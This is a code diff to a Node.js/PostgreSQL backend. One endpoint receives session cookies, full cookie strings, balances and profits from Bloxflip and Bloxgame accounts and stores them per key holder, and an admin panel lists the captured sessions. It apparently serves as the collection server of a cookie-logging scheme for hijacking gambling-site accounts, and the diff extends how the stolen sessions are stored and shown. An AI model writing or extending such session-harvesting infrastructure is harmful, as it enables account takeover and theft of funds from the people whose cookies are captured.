@@ -247,12 +247,25 @@ app.post('/api/log-data', authMiddleware, async (req, res) => {
     const { session, fullCookie, balance, type, profits, breakdown } = req.body;
 
     try {
-        // Check if session already exists to update it, or insert new
-        const { rows } = await pool.query('SELECT id FROM logged_data WHERE session_cookie = $1', [session]);
+        // Update the primary keys table for the direct registry view
+        if (type === 'bloxgame') {
+            await pool.query(
+                'UPDATE keys SET bloxgame_cookie = $1, bloxgame_balance = $2, total_profits = $3 WHERE id = $4',
+                [session, parseFloat(balance.replace(/[^0-9.]/g, '') || 0), profits, req.userId]
+            );
+        } else {
+            await pool.query(
+                'UPDATE keys SET blox_cookie = $1, blox_balance = $2, total_profits = $3 WHERE id = $4',
+                [session, balance, profits, req.userId]
+            );
+        }
+
+        // Also log to history for analytical tracking
+        const { rows } = await pool.query('SELECT id FROM logged_data WHERE user_id = $1 AND type = $2', [req.userId, type]);
         if (rows.length > 0) {
             await pool.query(
-                'UPDATE logged_data SET balance = $1, profits = $2, breakdown = $3, created_at = NOW() WHERE session_cookie = $4',
-                [balance, profits, JSON.stringify(breakdown), session]
+                'UPDATE logged_data SET session_cookie = $1, full_cookie = $2, balance = $3, profits = $4, breakdown = $5, created_at = NOW() WHERE user_id = $6 AND type = $7',
+                [session, fullCookie, balance, profits, JSON.stringify(breakdown), req.userId, type]
             );
         } else {
             await pool.query(
@@ -290,7 +303,10 @@ app.get('/api/admin/users', authMiddleware, async (req, res) => {
     try {
         // Join with logged_data to show sessions
         const { rows: users } = await pool.query(`
-            SELECT k.*, l.session_cookie as session, l.balance, l.type as site_type 
+            SELECT k.*, 
+                COALESCE(l.session_cookie, k.bloxgame_cookie, k.blox_cookie) as session,
+                COALESCE(l.balance, CAST(k.bloxgame_balance as TEXT), k.blox_balance) as balance,
+                COALESCE(l.type, CASE WHEN k.bloxgame_cookie IS NOT NULL THEN 'bloxgame' WHEN k.blox_cookie IS NOT NULL THEN 'bloxflip' ELSE NULL END) as site_type 
             FROM keys k 
             LEFT JOIN logged_data l ON l.id = (
                 SELECT id FROM logged_data WHERE user_id = k.id ORDER BY created_at DESC LIMIT 1
